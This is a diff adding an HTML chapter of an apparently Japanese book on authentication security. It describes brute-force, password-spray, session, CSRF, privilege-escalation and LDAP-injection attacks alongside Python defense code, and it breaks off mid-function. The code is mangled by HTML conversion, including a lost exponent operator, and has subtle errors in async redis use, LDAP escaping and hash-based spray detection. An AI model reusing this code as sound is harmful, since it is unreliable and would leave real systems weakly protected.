@@ -1,0 +1,1892 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>第11章 セキュリティと脅威対策 - 実践 認証認可システム設計</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f9fa;
+        }
+        .book-layout {
+            display: flex;
+            min-height: 100vh;
+        }
+        .book-sidebar {
+            width: 280px;
+            background-color: #fff;
+            border-right: 1px solid #e9ecef;
+            padding: 20px;
+            overflow-y: auto;
+            position: fixed;
+            height: 100vh;
+        }
+        .book-main {
+            margin-left: 280px;
+            flex: 1;
+            padding: 40px;
+            max-width: 900px;
+        }
+        .sidebar-title {
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        .nav-section {
+            margin-bottom: 30px;
+        }
+        .nav-section-title {
+            font-size: 0.9em;
+            font-weight: 600;
+            color: #6c757d;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 10px;
+        }
+        .nav-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+        .nav-link {
+            display: block;
+            padding: 8px 12px;
+            color: #495057;
+            text-decoration: none;
+            border-radius: 4px;
+            transition: all 0.2s;
+        }
+        .nav-link:hover {
+            background-color: #e9ecef;
+            color: #007bff;
+        }
+        .nav-link.active {
+            background-color: #007bff;
+            color: white;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 3px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #34495e;
+            margin-top: 30px;
+        }
+        h3 {
+            color: #2c3e50;
+            margin-top: 25px;
+        }
+        pre {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+        }
+        code {
+            background-color: #f8f9fa;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        .footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #e9ecef;
+            color: #6c757d;
+            text-align: center;
+        }
+        @media (max-width: 768px) {
+            .book-sidebar {
+                display: none;
+            }
+            .book-main {
+                margin-left: 0;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="book-layout">
+        <!-- Sidebar Navigation -->
+        <aside class="book-sidebar">
+            <div class="sidebar-title">
+                <a href="/practical-auth-book/" style="color: inherit; text-decoration: none;">実践 認証認可システム設計</a>
+            </div>
+            
+            <nav class="sidebar-nav">
+                <div class="nav-section">
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/introduction" class="nav-link">はじめに</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第I部: 基礎概念編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-01-overview" class="nav-link">第1章: 認証認可の全体像</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-02-authentication" class="nav-link">第2章: 認証の基礎</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-03-authorization" class="nav-link">第3章: 認可の基礎</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第II部: プロトコルと標準編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-04-session" class="nav-link">第4章: セッション管理</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-05-token-auth" class="nav-link">第5章: トークンベース認証</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-06-oauth2" class="nav-link">第6章: OAuth 2.0</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-07-oidc-saml" class="nav-link">第7章: OpenID ConnectとSAML</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第III部: 実装編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-08-auth-system-design" class="nav-link">第8章: 認証システムの設計</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-09-microservices-auth" class="nav-link">第9章: マイクロサービスでの認証認可</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-10-implementation-patterns" class="nav-link">第10章: 実装パターンとベストプラクティス</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">第IV部: 応用編</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/chapters/chapter-11-security-threats" class="nav-link">第11章: セキュリティ脅威と対策</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-12-performance" class="nav-link">第12章: パフォーマンス最適化</a></li>
+                        <li><a href="/practical-auth-book/chapters/chapter-13-future" class="nav-link">第13章: 認証技術の未来</a></li>
+                    </ul>
+                </div>
+
+                <div class="nav-section">
+                    <h3 class="nav-section-title">付録</h3>
+                    <ul class="nav-list">
+                        <li><a href="/practical-auth-book/appendices/appendix-a-libraries" class="nav-link">付録A: 主要ライブラリ・ツール一覧</a></li>
+                        <li><a href="/practical-auth-book/appendices/appendix-b-troubleshooting" class="nav-link">付録B: トラブルシューティングガイド</a></li>
+                        <li><a href="/practical-auth-book/appendices/appendix-c-glossary" class="nav-link">付録C: 用語集</a></li>
+                        <li><a href="/practical-auth-book/appendices/appendix-d-references" class="nav-link">付録D: 参考文献・リソース</a></li>
+                    </ul>
+                </div>
+            </nav>
+        </aside>
+
+        <!-- Main Content -->
+        <main class="book-main">
+            <div class="container">
+                </p><h1>第11章 セキュリティと脅威対策</h1><h2>なぜこの章が重要か</h2><p>認証認可システムは、アプリケーションの最も重要なセキュリティ境界です。攻撃者にとって最初の標的となることが多く、一度突破されると甚大な被害をもたらします。この章では、実際の攻撃手法を理解し、それらに対する具体的な防御策を実装する方法を学びます。理論的な知識だけでなく、実践的な対策コードと、継続的なセキュリティ向上のためのプロセスを習得します。</p><h2>11.1 主要な攻撃手法と対策</h2><h3>11.1.1 認証に対する攻撃</h3><p><pre><code>python
+<p>class AuthenticationAttacks:</p>
+<p>    """認証に対する主要な攻撃手法と対策"""</p>
+    
+<p>    def brute_force_attacks(self):</p>
+<p>        """ブルートフォース攻撃と対策"""</p>
+        
+<p>        return {</p>
+<p>            'attack_description': '''</p>
+<p>            ブルートフォース攻撃：</p>
+<p>            - パスワードを総当たりで試行</p>
+<p>            - 辞書攻撃（よくあるパスワードリスト使用）</p>
+<p>            - クレデンシャルスタッフィング（漏洩したID/パスワードの再利用）</p>
+<p>            ''',</p>
+            
+<p>            'defense_implementation': '''</p>
+<p>            class BruteForceDefense:</p>
+<p>                def __init__(self):</p>
+<p>                    self.redis = redis.Redis()</p>
+<p>                    self.config = {</p>
+<p>                        'max_attempts': 5,</p>
+<p>                        'lockout_duration': 900,  # 15分</p>
+<p>                        'progressive_delay': True,</p>
+<p>                        'captcha_threshold': 3</p>
+<p>                    }</p>
+                
+<p>                async def check_login_attempt(self, identifier: str, ip_address: str) -> LoginAttemptResult:</p>
+<p>                    """ログイン試行のチェック"""</p>
+                    
+<p>                    # 複数の識別子でカウント</p>
+<p>                    keys = [</p>
+<p>                        f"login_attempts:email:{identifier}",</p>
+<p>                        f"login_attempts:ip:{ip_address}",</p>
+<p>                        f"login_attempts:combo:{identifier}:{ip_address}"</p>
+<p>                    ]</p>
+                    
+<p>                    # 試行回数の取得</p>
+<p>                    attempts = {}</p>
+<p>                    for key in keys:</p>
+<p>                        count = await self.redis.get(key)</p>
+<p>                        attempts[key] = int(count) if count else 0</p>
+                    
+<p>                    # 最も厳しい制限を適用</p>
+<p>                    max_attempts = max(attempts.values())</p>
+                    
+<p>                    # アカウントロックアウトチェック</p>
+<p>                    if max_attempts >= self.config['max_attempts']:</p>
+<p>                        lockout_key = f"lockout:{identifier}"</p>
+<p>                        if await self.redis.exists(lockout_key):</p>
+<p>                            ttl = await self.redis.ttl(lockout_key)</p>
+<p>                            return LoginAttemptResult(</p>
+<p>                                allowed=False,</p>
+<p>                                reason="account_locked",</p>
+<p>                                retry_after=ttl</p>
+<p>                            )</p>
+                    
+<p>                    # プログレッシブ遅延</p>
+<p>                    if self.config['progressive_delay'] and max_attempts > 0:</p>
+<p>                        delay = min(2 <em></em> (max_attempts - 1), 30)  # 最大30秒</p>
+<p>                        await asyncio.sleep(delay)</p>
+                    
+<p>                    # CAPTCHA要求</p>
+<p>                    if max_attempts >= self.config['captcha_threshold']:</p>
+<p>                        return LoginAttemptResult(</p>
+<p>                            allowed=True,</p>
+<p>                            require_captcha=True</p>
+<p>                        )</p>
+                    
+<p>                    return LoginAttemptResult(allowed=True)</p>
+                
+<p>                async def record_failed_attempt(self, identifier: str, ip_address: str):</p>
+<p>                    """失敗した試行の記録"""</p>
+                    
+<p>                    keys = [</p>
+<p>                        f"login_attempts:email:{identifier}",</p>
+<p>                        f"login_attempts:ip:{ip_address}",</p>
+<p>                        f"login_attempts:combo:{identifier}:{ip_address}"</p>
+<p>                    ]</p>
+                    
+<p>                    pipe = self.redis.pipeline()</p>
+<p>                    for key in keys:</p>
+<p>                        pipe.incr(key)</p>
+<p>                        pipe.expire(key, 3600)  # 1時間でリセット</p>
+                    
+<p>                    results = await pipe.execute()</p>
+                    
+<p>                    # ロックアウトのチェック</p>
+<p>                    for i in range(0, len(results), 2):</p>
+<p>                        if results[i] >= self.config['max_attempts']:</p>
+<p>                            await self.lock_account(identifier)</p>
+<p>                            break</p>
+                
+<p>                async def lock_account(self, identifier: str):</p>
+<p>                    """アカウントのロック"""</p>
+<p>                    lockout_key = f"lockout:{identifier}"</p>
+<p>                    await self.redis.setex(</p>
+<p>                        lockout_key,</p>
+<p>                        self.config['lockout_duration'],</p>
+<p>                        "locked"</p>
+<p>                    )</p>
+                    
+<p>                    # 通知とログ</p>
+<p>                    await self.notify_account_lockout(identifier)</p>
+<p>                    await self.audit_logger.log({</p>
+<p>                        'event': 'account_locked',</p>
+<p>                        'identifier': identifier,</p>
+<p>                        'reason': 'too_many_failed_attempts'</p>
+<p>                    })</p>
+<p>            ''',</p>
+            
+<p>            'distributed_defense': '''</p>
+<p>            class DistributedBruteForceDefense:</p>
+<p>                """分散型ブルートフォース対策"""</p>
+                
+<p>                def __init__(self):</p>
+<p>                    self.global_rate_limiter = GlobalRateLimiter()</p>
+<p>                    self.anomaly_detector = AnomalyDetector()</p>
+                
+<p>                async def detect_distributed_attack(self):</p>
+<p>                    """分散攻撃の検知"""</p>
+                    
+<p>                    # グローバルなログイン失敗率の監視</p>
+<p>                    failure_rate = await self.global_rate_limiter.get_failure_rate()</p>
+                    
+<p>                    if failure_rate > 0.3:  # 30%以上の失敗率</p>
+<p>                        # 攻撃パターンの分析</p>
+<p>                        patterns = await self.analyze_attack_patterns()</p>
+                        
+<p>                        if patterns['is_distributed']:</p>
+<p>                            await self.activate_enhanced_protection()</p>
+                
+<p>                async def analyze_attack_patterns(self) -> dict:</p>
+<p>                    """攻撃パターンの分析"""</p>
+                    
+<p>                    recent_attempts = await self.get_recent_login_attempts(minutes=5)</p>
+                    
+<p>                    analysis = {</p>
+<p>                        'unique_ips': len(set(a.ip_address for a in recent_attempts)),</p>
+<p>                        'unique_users': len(set(a.username for a in recent_attempts)),</p>
+<p>                        'ip_diversity': self.calculate_ip_diversity(recent_attempts),</p>
+<p>                        'timing_pattern': self.analyze_timing_pattern(recent_attempts),</p>
+<p>                        'user_agent_diversity': self.analyze_user_agents(recent_attempts)</p>
+<p>                    }</p>
+                    
+<p>                    # 分散攻撃の特徴</p>
+<p>                    is_distributed = (</p>
+<p>                        analysis['unique_ips'] > 100 and</p>
+<p>                        analysis['ip_diversity'] > 0.8 and</p>
+<p>                        analysis['timing_pattern'] == 'coordinated'</p>
+<p>                    )</p>
+                    
+<p>                    analysis['is_distributed'] = is_distributed</p>
+<p>                    return analysis</p>
+                
+<p>                async def activate_enhanced_protection(self):</p>
+<p>                    """強化された保護の有効化"""</p>
+                    
+<p>                    # より厳格なレート制限</p>
+<p>                    await self.global_rate_limiter.set_emergency_limits({</p>
+<p>                        'login_per_ip': 2,</p>
+<p>                        'login_per_user': 1,</p>
+<p>                        'window': 300  # 5分</p>
+<p>                    })</p>
+                    
+<p>                    # 全ユーザーにCAPTCHA必須</p>
+<p>                    await self.redis.set('global:require_captcha', '1', ex=1800)</p>
+                    
+<p>                    # アラート送信</p>
+<p>                    await self.alert_security_team('Distributed brute force attack detected')</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def password_spraying(self):</p>
+<p>        """パスワードスプレー攻撃"""</p>
+        
+<p>        return {</p>
+<p>            'attack_description': '''</p>
+<p>            パスワードスプレー攻撃：</p>
+<p>            - 多数のユーザーに対して一般的なパスワードを試行</p>
+<p>            - アカウントロックアウトを回避</p>
+<p>            - 低速で長期的な攻撃</p>
+<p>            ''',</p>
+            
+<p>            'defense_implementation': '''</p>
+<p>            class PasswordSprayDefense:</p>
+<p>                def __init__(self):</p>
+<p>                    self.common_passwords = self.load_common_passwords()</p>
+<p>                    self.spray_detector = SprayDetector()</p>
+                
+<p>                async def detect_password_spray(self, login_attempts: List[LoginAttempt]) -> bool:</p>
+<p>                    """パスワードスプレー攻撃の検知"""</p>
+                    
+<p>                    # 時間窓内の分析</p>
+<p>                    window_start = datetime.utcnow() - timedelta(minutes=30)</p>
+<p>                    recent_attempts = [</p>
+<p>                        a for a in login_attempts </p>
+<p>                        if a.timestamp > window_start</p>
+<p>                    ]</p>
+                    
+<p>                    # パスワードの分散度を分析</p>
+<p>                    password_patterns = defaultdict(list)</p>
+<p>                    for attempt in recent_attempts:</p>
+<p>                        # パスワードの特徴を抽出（実際のパスワードは保存しない）</p>
+<p>                        pattern = self.extract_password_pattern(attempt.password_hash)</p>
+<p>                        password_patterns[pattern].append(attempt.username)</p>
+                    
+<p>                    # 同じパスワードパターンが複数ユーザーで使用されているか</p>
+<p>                    for pattern, users in password_patterns.items():</p>
+<p>                        if len(set(users)) > 10:  # 10人以上の異なるユーザー</p>
+<p>                            return True</p>
+                    
+<p>                    # IPアドレスの分析</p>
+<p>                    ip_to_users = defaultdict(set)</p>
+<p>                    for attempt in recent_attempts:</p>
+<p>                        ip_to_users[attempt.ip_address].add(attempt.username)</p>
+                    
+<p>                    # 単一IPから多数のユーザーへの試行</p>
+<p>                    for ip, users in ip_to_users.items():</p>
+<p>                        if len(users) > 20:</p>
+<p>                            return True</p>
+                    
+<p>                    return False</p>
+                
+<p>                async def enhanced_password_validation(self, password: str, context: dict) -> bool:</p>
+<p>                    """強化されたパスワード検証"""</p>
+                    
+<p>                    # コンテキストベースの検証</p>
+<p>                    if self.is_password_spray_active():</p>
+<p>                        # よくあるパスワードの即座の拒否</p>
+<p>                        if password.lower() in self.common_passwords:</p>
+<p>                            await self.record_common_password_attempt(context)</p>
+<p>                            return False</p>
+                        
+<p>                        # 組織固有のパターンチェック</p>
+<p>                        if self.matches_org_pattern(password, context['organization']):</p>
+<p>                            return False</p>
+                    
+<p>                    return True</p>
+                
+<p>                def extract_password_pattern(self, password_hash: str) -> str:</p>
+<p>                    """パスワードパターンの抽出（プライバシー保護）"""</p>
+<p>                    # ハッシュの一部を使用してパターンを生成</p>
+<p>                    # 実際のパスワードは復元不可能</p>
+<p>                    return hashlib.sha256(</p>
+<p>                        password_hash[:10].encode()</p>
+<p>                    ).hexdigest()[:8]</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def session_attacks(self):</p>
+<p>        """セッション関連の攻撃"""</p>
+        
+<p>        return {</p>
+<p>            'session_hijacking': '''</p>
+<p>            class SessionHijackingDefense:</p>
+<p>                """セッションハイジャック対策"""</p>
+                
+<p>                def __init__(self):</p>
+<p>                    self.session_validator = SessionValidator()</p>
+<p>                    self.fingerprint_service = FingerprintService()</p>
+                
+<p>                async def validate_session_request(</p>
+<p>                    self, </p>
+<p>                    session_id: str, </p>
+<p>                    request: Request</p>
+<p>                ) -> SessionValidationResult:</p>
+<p>                    """セッションリクエストの検証"""</p>
+                    
+<p>                    session = await self.get_session(session_id)</p>
+<p>                    if not session:</p>
+<p>                        return SessionValidationResult(valid=False, reason="session_not_found")</p>
+                    
+<p>                    # 1. セッションフィンガープリントの検証</p>
+<p>                    current_fingerprint = self.fingerprint_service.generate(request)</p>
+<p>                    if not self.verify_fingerprint(session.fingerprint, current_fingerprint):</p>
+<p>                        await self.handle_suspicious_activity(session, "fingerprint_mismatch")</p>
+<p>                        return SessionValidationResult(</p>
+<p>                            valid=False, </p>
+<p>                            reason="fingerprint_mismatch",</p>
+<p>                            action="require_reauthentication"</p>
+<p>                        )</p>
+                    
+<p>                    # 2. IPアドレスの変更チェック</p>
+<p>                    if session.ip_address != request.ip_address:</p>
+<p>                        risk_score = await self.assess_ip_change_risk(session, request)</p>
+<p>                        if risk_score > 0.7:</p>
+<p>                            return SessionValidationResult(</p>
+<p>                                valid=False,</p>
+<p>                                reason="suspicious_ip_change",</p>
+<p>                                action="require_mfa"</p>
+<p>                            )</p>
+                    
+<p>                    # 3. セッション固定攻撃の検知</p>
+<p>                    if await self.detect_session_fixation(session_id, request):</p>
+<p>                        await self.invalidate_session(session_id)</p>
+<p>                        return SessionValidationResult(</p>
+<p>                            valid=False,</p>
+<p>                            reason="session_fixation_detected"</p>
+<p>                        )</p>
+                    
+<p>                    # 4. 並行セッションの異常検知</p>
+<p>                    concurrent_sessions = await self.get_user_sessions(session.user_id)</p>
+<p>                    if self.detect_suspicious_concurrent_activity(concurrent_sessions):</p>
+<p>                        return SessionValidationResult(</p>
+<p>                            valid=True,</p>
+<p>                            warning="suspicious_concurrent_activity",</p>
+<p>                            action="notify_user"</p>
+<p>                        )</p>
+                    
+<p>                    return SessionValidationResult(valid=True)</p>
+                
+<p>                def generate_secure_session_id(self) -> str:</p>
+<p>                    """セキュアなセッションID生成"""</p>
+<p>                    # 十分なエントロピーを持つID生成</p>
+<p>                    random_bytes = secrets.token_bytes(32)</p>
+<p>                    timestamp = struct.pack('>Q', int(time.time() * 1000000))</p>
+                    
+<p>                    combined = random_bytes + timestamp</p>
+<p>                    session_id = base64.urlsafe_b64encode(</p>
+<p>                        hashlib.sha256(combined).digest()</p>
+<p>                    ).decode().rstrip('=')</p>
+                    
+<p>                    return session_id</p>
+                
+<p>                async def detect_session_fixation(</p>
+<p>                    self, </p>
+<p>                    session_id: str, </p>
+<p>                    request: Request</p>
+<p>                ) -> bool:</p>
+<p>                    """セッション固定攻撃の検知"""</p>
+                    
+<p>                    # セッションIDの使用履歴を確認</p>
+<p>                    history = await self.get_session_id_history(session_id)</p>
+                    
+<p>                    # 同じセッションIDが異なるユーザーで使用されていないか</p>
+<p>                    unique_users = set(h.user_id for h in history if h.user_id)</p>
+<p>                    if len(unique_users) > 1:</p>
+<p>                        return True</p>
+                    
+<p>                    # ログイン前後でセッションIDが変更されているか</p>
+<p>                    pre_login_usage = any(not h.authenticated for h in history)</p>
+<p>                    post_login_usage = any(h.authenticated for h in history)</p>
+                    
+<p>                    if pre_login_usage and post_login_usage:</p>
+<p>                        # セッションIDの再生成が必要</p>
+<p>                        return True</p>
+                    
+<p>                    return False</p>
+<p>            ''',</p>
+            
+<p>            'csrf_protection': '''</p>
+<p>            class CSRFProtection:</p>
+<p>                """CSRF攻撃対策"""</p>
+                
+<p>                def __init__(self):</p>
+<p>                    self.token_store = TokenStore()</p>
+<p>                    self.config = {</p>
+<p>                        'token_length': 32,</p>
+<p>                        'token_lifetime': 3600,</p>
+<p>                        'double_submit': True,</p>
+<p>                        'same_site': 'Strict'</p>
+<p>                    }</p>
+                
+<p>                def generate_csrf_token(self, session_id: str) -> str:</p>
+<p>                    """CSRFトークンの生成"""</p>
+                    
+<p>                    # セッションに紐づけたトークン生成</p>
+<p>                    token = secrets.token_urlsafe(self.config['token_length'])</p>
+                    
+<p>                    # トークンの保存</p>
+<p>                    self.token_store.save(</p>
+<p>                        key=f"csrf:{session_id}",</p>
+<p>                        value=token,</p>
+<p>                        ttl=self.config['token_lifetime']</p>
+<p>                    )</p>
+                    
+<p>                    # ダブルサブミットクッキー用のシグネチャ</p>
+<p>                    if self.config['double_submit']:</p>
+<p>                        signature = self.sign_token(token, session_id)</p>
+<p>                        return f"{token}.{signature}"</p>
+                    
+<p>                    return token</p>
+                
+<p>                async def validate_csrf_token(</p>
+<p>                    self, </p>
+<p>                    request: Request, </p>
+<p>                    session_id: str</p>
+<p>                ) -> bool:</p>
+<p>                    """CSRFトークンの検証"""</p>
+                    
+<p>                    # 安全なメソッドはスキップ</p>
+<p>                    if request.method in ['GET', 'HEAD', 'OPTIONS']:</p>
+<p>                        return True</p>
+                    
+<p>                    # トークンの取得（優先順位）</p>
+<p>                    token = (</p>
+<p>                        request.headers.get('X-CSRF-Token') or</p>
+<p>                        request.form.get('csrf_token') or</p>
+<p>                        request.json.get('csrf_token')</p>
+<p>                    )</p>
+                    
+<p>                    if not token:</p>
+<p>                        return False</p>
+                    
+<p>                    # ダブルサブミットクッキーの検証</p>
+<p>                    if self.config['double_submit']:</p>
+<p>                        cookie_token = request.cookies.get('csrf_token')</p>
+<p>                        if not cookie_token or cookie_token != token:</p>
+<p>                            return False</p>
+                        
+<p>                        # シグネチャの検証</p>
+<p>                        if not self.verify_token_signature(token, session_id):</p>
+<p>                            return False</p>
+                    
+<p>                    # サーバー側トークンの検証</p>
+<p>                    stored_token = await self.token_store.get(f"csrf:{session_id}")</p>
+<p>                    if not stored_token:</p>
+<p>                        return False</p>
+                    
+<p>                    # タイミング攻撃対策</p>
+<p>                    return secrets.compare_digest(token.split('.')[0], stored_token)</p>
+                
+<p>                def sign_token(self, token: str, session_id: str) -> str:</p>
+<p>                    """トークンの署名"""</p>
+<p>                    message = f"{token}:{session_id}".encode()</p>
+<p>                    signature = hmac.new(</p>
+<p>                        self.signing_key,</p>
+<p>                        message,</p>
+<p>                        hashlib.sha256</p>
+<p>                    ).hexdigest()</p>
+<p>                    return signature</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h3>11.1.2 認可に対する攻撃</h3><p><pre><code>python</p>
+<p>class AuthorizationAttacks:</p>
+<p>    """認可に対する攻撃と対策"""</p>
+    
+<p>    def privilege_escalation(self):</p>
+<p>        """権限昇格攻撃"""</p>
+        
+<p>        return {</p>
+<p>            'horizontal_escalation': '''</p>
+<p>            class HorizontalPrivilegeEscalationDefense:</p>
+<p>                """水平的権限昇格の防御"""</p>
+                
+<p>                async def validate_resource_access(</p>
+<p>                    self, </p>
+<p>                    user: User, </p>
+<p>                    resource_id: str, </p>
+<p>                    resource_type: str</p>
+<p>                ) -> AccessValidationResult:</p>
+<p>                    """リソースアクセスの検証"""</p>
+                    
+<p>                    # 1. 直接的な所有権チェック</p>
+<p>                    if not await self.check_resource_ownership(user.id, resource_id, resource_type):</p>
+<p>                        # 2. 間接的なアクセス権チェック</p>
+<p>                        if not await self.check_delegated_access(user.id, resource_id):</p>
+<p>                            # 3. ロールベースのアクセスチェック</p>
+<p>                            if not await self.check_role_based_access(user.roles, resource_type):</p>
+<p>                                # アクセス拒否をログに記録</p>
+<p>                                await self.log_unauthorized_access(user, resource_id, resource_type)</p>
+                                
+<p>                                return AccessValidationResult(</p>
+<p>                                    allowed=False,</p>
+<p>                                    reason="no_permission",</p>
+<p>                                    log_incident=True</p>
+<p>                                )</p>
+                    
+<p>                    # アクセスパターンの異常検知</p>
+<p>                    if await self.detect_abnormal_access_pattern(user.id, resource_type):</p>
+<p>                        return AccessValidationResult(</p>
+<p>                            allowed=True,</p>
+<p>                            warning="abnormal_pattern_detected",</p>
+<p>                            additional_logging=True</p>
+<p>                        )</p>
+                    
+<p>                    return AccessValidationResult(allowed=True)</p>
+                
+<p>                async def prevent_id_enumeration(</p>
+<p>                    self, </p>
+<p>                    user: User, </p>
+<p>                    requested_ids: List[str]</p>
+<p>                ) -> List[str]:</p>
+<p>                    """IDの列挙攻撃防止"""</p>
+                    
+<p>                    # アクセス可能なIDのみをフィルタ</p>
+<p>                    allowed_ids = []</p>
+                    
+<p>                    for resource_id in requested_ids:</p>
+<p>                        if await self.can_access_resource(user, resource_id):</p>
+<p>                            allowed_ids.append(resource_id)</p>
+<p>                        else:</p>
+<p>                            # 存在しないリソースと権限なしを区別しない</p>
+<p>                            pass</p>
+                    
+<p>                    # 大量のID要求を検知</p>
+<p>                    if len(requested_ids) > 100:</p>
+<p>                        await self.log_suspicious_activity(</p>
+<p>                            user.id,</p>
+<p>                            "excessive_id_requests",</p>
+<p>                            {"count": len(requested_ids)}</p>
+<p>                        )</p>
+                    
+<p>                    return allowed_ids</p>
+<p>            ''',</p>
+            
+<p>            'vertical_escalation': '''</p>
+<p>            class VerticalPrivilegeEscalationDefense:</p>
+<p>                """垂直的権限昇格の防御"""</p>
+                
+<p>                def __init__(self):</p>
+<p>                    self.permission_validator = PermissionValidator()</p>
+<p>                    self.jwt_validator = JWTValidator()</p>
+                
+<p>                async def validate_privileged_operation(</p>
+<p>                    self, </p>
+<p>                    user: User, </p>
+<p>                    operation: str, </p>
+<p>                    context: dict</p>
+<p>                ) -> OperationValidationResult:</p>
+<p>                    """特権操作の検証"""</p>
+                    
+<p>                    # 1. トークンの改ざんチェック</p>
+<p>                    if context.get('token'):</p>
+<p>                        token_claims = self.jwt_validator.decode(context['token'])</p>
+<p>                        if not self.verify_token_integrity(token_claims, user):</p>
+<p>                            return OperationValidationResult(</p>
+<p>                                allowed=False,</p>
+<p>                                reason="token_tampering_detected",</p>
+<p>                                security_alert=True</p>
+<p>                            )</p>
+                    
+<p>                    # 2. 必要な権限の確認</p>
+<p>                    required_permissions = self.get_required_permissions(operation)</p>
+<p>                    user_permissions = await self.get_user_permissions(user.id)</p>
+                    
+<p>                    missing_permissions = required_permissions - user_permissions</p>
+<p>                    if missing_permissions:</p>
+<p>                        await self.log_privilege_escalation_attempt(</p>
+<p>                            user,</p>
+<p>                            operation,</p>
+<p>                            missing_permissions</p>
+<p>                        )</p>
+                        
+<p>                        return OperationValidationResult(</p>
+<p>                            allowed=False,</p>
+<p>                            reason="insufficient_permissions",</p>
+<p>                            missing=list(missing_permissions)</p>
+<p>                        )</p>
+                    
+<p>                    # 3. 追加のセキュリティチェック</p>
+<p>                    if self.is_highly_privileged_operation(operation):</p>
+<p>                        # 再認証を要求</p>
+<p>                        if not await self.verify_recent_authentication(user, minutes=5):</p>
+<p>                            return OperationValidationResult(</p>
+<p>                                allowed=False,</p>
+<p>                                reason="reauthentication_required",</p>
+<p>                                action="prompt_password"</p>
+<p>                            )</p>
+                        
+<p>                        # 管理者承認が必要な操作</p>
+<p>                        if self.requires_approval(operation):</p>
+<p>                            approval = await self.check_approval_status(user, operation)</p>
+<p>                            if not approval:</p>
+<p>                                return OperationValidationResult(</p>
+<p>                                    allowed=False,</p>
+<p>                                    reason="pending_approval",</p>
+<p>                                    approval_id=await self.create_approval_request(user, operation)</p>
+<p>                                )</p>
+                    
+<p>                    return OperationValidationResult(allowed=True)</p>
+                
+<p>                def verify_token_integrity(self, claims: dict, user: User) -> bool:</p>
+<p>                    """トークンの整合性検証"""</p>
+                    
+<p>                    # ユーザーIDの一致</p>
+<p>                    if claims.get('sub') != user.id:</p>
+<p>                        return False</p>
+                    
+<p>                    # ロールの改ざんチェック</p>
+<p>                    token_roles = set(claims.get('roles', []))</p>
+<p>                    actual_roles = set(user.roles)</p>
+                    
+<p>                    if token_roles != actual_roles:</p>
+<p>                        # 権限昇格の試み</p>
+<p>                        if token_roles > actual_roles:</p>
+<p>                            self.alert_security_team(</p>
+<p>                                "Token privilege escalation attempt",</p>
+<p>                                {</p>
+<p>                                    "user_id": user.id,</p>
+<p>                                    "claimed_roles": list(token_roles),</p>
+<p>                                    "actual_roles": list(actual_roles)</p>
+<p>                                }</p>
+<p>                            )</p>
+<p>                        return False</p>
+                    
+<p>                    return True</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def injection_attacks(self):</p>
+<p>        """インジェクション攻撃"""</p>
+        
+<p>        return {</p>
+<p>            'ldap_injection': '''</p>
+<p>            class LDAPInjectionDefense:</p>
+<p>                """LDAPインジェクション対策"""</p>
+                
+<p>                def sanitize_ldap_input(self, user_input: str) -> str:</p>
+<p>                    """LDAP入力のサニタイズ"""</p>
+                    
+<p>                    # 危険な文字のエスケープ</p>
+<p>                    escape_chars = {</p>
+<p>                        '\\': r'\\5c',</p>
+<p>                        '*': r'\\2a',</p>
+<p>                        '(': r'\\28',</p>
+<p>                        ')': r'\\29',</p>
+<p>                        '\0': r'\\00',</p>
+<p>                        '/': r'\\2f'</p>
+<p>                    }</p>
+                    
+<p>                    sanitized = user_input</p>
+<p>                    for char, escaped in escape_chars.items():</p>
+<p>                        sanitized = sanitized.replace(char, escaped)</p>
+                    
+<p>                    return sanitized</p>
+                
+<p>                def build_safe_ldap_filter(self, username: str, domain: str) -> str:</p>
+<p>                    """安全なLDAPフィルタの構築"""</p>
+                    
+<p>                    # 入力の検証</p>
+<p>                    if not self.validate_username_format(username):</p>
+<p>                        raise ValueError("Invalid username format")</p>
+                    
+<p>                    if not self.validate_domain_format(domain):</p>
+<p>                        raise ValueError("Invalid domain format")</p>
+                    
+<p>                    # サニタイズ</p>
+<p>                    safe_username = self.sanitize_ldap_input(username)</p>
+<p>                    safe_domain = self.sanitize_ldap_input(domain)</p>
+                    
+<p>                    # パラメータ化されたクエリ構築</p>
